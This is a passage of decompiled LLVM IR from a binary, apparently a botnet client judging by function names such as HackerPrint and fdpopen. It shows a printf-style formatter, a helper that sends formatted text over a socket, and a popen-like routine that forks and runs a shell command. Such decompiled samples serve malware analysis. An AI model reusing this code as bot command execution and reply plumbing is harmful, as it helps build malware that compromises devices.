  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f970.30, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-12, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_30604.32, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_30604.32, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp3, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1f978.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_1f980.36 to i32), i32 ptrtoint ([3 x i8]* @global_var_1f984.38 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp3, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_30604.32, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_30604.32, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

